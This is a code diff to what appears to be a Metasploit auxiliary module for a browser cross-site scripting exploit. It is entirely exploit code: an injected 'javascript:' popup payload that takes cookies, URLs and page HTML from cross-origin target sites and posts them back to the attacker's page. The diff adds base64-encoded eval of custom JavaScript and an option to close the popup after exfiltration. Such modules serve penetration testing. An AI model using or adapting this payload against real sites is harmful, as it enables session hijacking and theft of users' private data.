@@ -53,6 +53,11 @@ class Metasploit3 < Msf::Auxiliary
         false,
         "Bypass URLs that have X-Frame-Options by using a one-click popup exploit.",
         false
+      ]),
+      OptBool.new('CLOSE_POPUP', [
+        false,
+        "When BYPASS_XFO is enabled, this closes the popup window after exfiltration.",
+        true
       ])
     ], self.class)
   end
@@ -76,8 +81,11 @@ class Metasploit3 < Msf::Auxiliary
         var received = [];
 
         window.addEventListener('message', function(e) {
-          if (bypassXFO && received[JSON.parse(e.data).i]) return;
-          if (bypassXFO && e.data) received.push(true);
+          var data = JSON.parse(e.data);
+          if (!data.send) {
+            if (bypassXFO && data.i && received[data.i]) return;
+            if (bypassXFO && e.data) received.push(true);
+          }
           var x = new XMLHttpRequest;
           x.open('POST', window.location, true);
           x.send(e.data);
@@ -105,12 +113,14 @@ class Metasploit3 < Msf::Auxiliary
 
         function attack(target, n, i, cachedN) {
           var exploit = function(){
-            window.open('\\u0000javascript:if(document&&document.body){(opener||top).postMessage(JSON.stringify({cookie:document'+
-              '.cookie,url:location.href,body:document.body.innerHTML,i:'+(i||0)+'}),"*");'+
-              '#{datastore['CUSTOM_JS']||''};}void(0);', n);
+            window.open('\\u0000javascript:if(document&&document.body){(opener||top).postMessage('+
+              'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+
+              'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(datastore['CUSTOM_JS'])}"'+
+              '));}void(0);', n);
           }
           if (!n) {
             n = cachedN || randomString();
+            var closePopup = #{datastore['CLOSE_POPUP']};
             var w = window.open(target, n);
             var deadman = setTimeout(function(){
               clearInterval(clear);
@@ -119,15 +129,19 @@ class Metasploit3 < Msf::Auxiliary
             }, 10000);
             var clear = setInterval(function(){
               if (received[i]) {
-                try{ w.stop(); }catch(e){}
-                try{ w.location='data:text/html,<p>Loading...</p>'; }catch(e){}
+                if (i < targets.length-1) {
+                  try{ w.stop(); }catch(e){}
+                  try{ w.location='data:text/html,<p>Loading...</p>'; }catch(e){}
+                }
+
                 clearInterval(clear);
                 clearInterval(clear2);
                 clearTimeout(deadman);
+
                 if (i < targets.length-1) {
                   setTimeout(function(){ attack(targets[i+1], null, i+1, n); },100);
                 } else {
-                  w.close();
+                  if (closePopup) w.close();
                 }
               }
             }, 50);
